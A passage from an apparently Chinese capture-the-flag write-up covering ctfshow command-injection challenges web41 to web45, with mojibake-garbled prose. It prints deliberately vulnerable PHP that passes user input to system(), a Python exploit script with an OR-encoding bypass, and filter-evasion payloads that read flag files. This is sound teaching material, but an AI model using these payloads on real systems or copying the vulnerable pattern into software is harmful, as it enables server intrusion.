punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>			<span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>			<span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>			<span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>					<span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  </pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		<span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>			<span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>å†é€šè¿‡ python <span class="exturl" data-url="aHR0cDovL2V4cC5weQ==">exp.py</span> [url] çš„æ–¹å¼è¿è¡Œã€‚</p><p>è¿™é‡Œè¯´ä¸€å¥ï¼Œç”±äºè„šæœ¬å¯¼å…¥äº† urllib åŒ…ï¼Œpython2 æ²¡æ‰¾åˆ°ï¼Œæ‰€ä»¥å°±ç”¨ python3ï¼Œpython3 è‡ªå¸¦çš„ urllib åŒ… (èŠ±äº†ä¸‰å°æ—¶æ‰¾åˆ°ç»“æœ)</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> urllib</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="6"></td><td><pre>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"php rce_or.php"</span><span class="token punctuation">)</span>  <span class="token comment">#æ²¡æœ‰å°† php å†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'USERï¼š&lt;url>'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"egï¼š  python exp.py http://ctf.show/"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>   exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>url<span class="token operator">=</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>   s1<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="16"></td><td><pre>   s2<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="17"></td><td><pre>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>               <span class="token keyword">break</span></pre></td></tr><tr><td data-num="23"></td><td><pre>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>               <span class="token comment">#print(i)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="26"></td><td><pre>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="27"></td><td><pre>               <span class="token keyword">break</span></pre></td></tr><tr><td data-num="28"></td><td><pre>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span></pre></td></tr><tr><td data-num="30"></td><td><pre>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>   </pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>   data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>       <span class="token string">'c'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>param<span class="token punctuation">)</span>	<span class="token operator">//</span>å‚æ•°ï¼Œå¯æ”¹</pre></td></tr><tr><td data-num="36"></td><td><pre>       <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>   r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;729fcef2-a2e1-4a6e-87b4-e46e48ac9b62&#125;
</code></pre><h2 id="web42"><a class="anchor" href="#web42">#</a> web42</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 20:51:55</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token constant">null</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span>ä¸»è¦æ„æ€æ˜¯ä¸è¿›è¡Œå›æ˜¾çš„æ„æ€</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>åˆ†è§£è¿™ä¸ªç»„åˆï¼šâ€œ<span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token constant">null</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span>â€ ä¸ºäº”éƒ¨åˆ†ã€‚</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">1</span>ï¼š<span class="token operator">></span> ä»£è¡¨é‡å®šå‘åˆ°å“ªé‡Œï¼Œä¾‹å¦‚ï¼š<span class="token keyword">echo</span> <span class="token string double-quoted-string">"123"</span> <span class="token operator">></span> <span class="token operator">/</span>home<span class="token operator">/</span><span class="token number">123.</span>txt</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">2</span>ï¼š<span class="token operator">/</span>dev<span class="token operator">/</span><span class="token constant">null</span> ä»£è¡¨ç©ºè®¾å¤‡æ–‡ä»¶</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">3</span>ï¼š<span class="token number">2</span><span class="token operator">></span> è¡¨ç¤ºstderræ ‡å‡†é”™è¯¯</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">4</span>ï¼š<span class="token operator">&amp;</span> è¡¨ç¤ºç­‰åŒäºçš„æ„æ€ï¼Œ<span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span>ï¼Œè¡¨ç¤º<span class="token number">2</span>çš„è¾“å‡ºé‡å®šå‘ç­‰åŒäº<span class="token number">1</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">5</span>ï¼š<span class="token number">1</span> è¡¨ç¤ºstdoutæ ‡å‡†è¾“å‡ºï¼Œç³»ç»Ÿé»˜è®¤å€¼æ˜¯<span class="token number">1</span>ï¼Œæ‰€ä»¥<span class="token string double-quoted-string">">/dev/null"</span>ç­‰åŒäº <span class="token string double-quoted-string">"1>/dev/null"</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>æˆ‘ä»¬è¦è®©å‘½ä»¤å›æ˜¾ï¼Œé‚£ä¹ˆè¿›è¡Œå‘½ä»¤åˆ†éš”å³å¯</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">;</span> <span class="token comment">// åˆ†å·</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">|</span> <span class="token comment">// åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">||</span> <span class="token comment">// åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">&amp;</span> <span class="token comment">// ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">&amp;&amp;</span> <span class="token comment">// ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>c<span class="token operator">=</span>cat flag<span class="token operator">.</span>php<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>c<span class="token operator">=</span>cat flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token class-name">c</span><span class="token operator">=</span>cat flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a  <span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">0</span>aæ¢è¡Œç¬¦<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="web43"><a class="anchor" href="#web43">#</a> web43</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 21:32:51</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>å®¡è®¡ä»£ç ï¼Œè¿‡æ»¤äº†catå’Œåˆ†å·</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>more flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>sort flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>less flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tail flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>nl flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>strings flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;38c4a65d-9e24-45ae-bb80-589f5e2fb4e4&#125;
</code></pre><h2 id="web44"><a class="anchor" href="#web44">#</a> web44</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 21:32:01</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/;|cat|flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿‡æ»¤äº†åˆ†å·ã€catã€flag,é€šé…ç¬¦ç»•è¿‡å³å¯

payload
c=tac f*||
c=tac ????.???||
c=tac fl\ag.php||
c=tac fl''ag.php||
c=tac f*%0a
</code></pre><pre><code>ctfshow&#123;cf2310be-6e0a-45ce-a0bd-dd266236e994&#125;
</code></pre><h2 id="web45"><a class="anchor" href="#web45">#</a> web45</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 21:35:34</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| /i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token 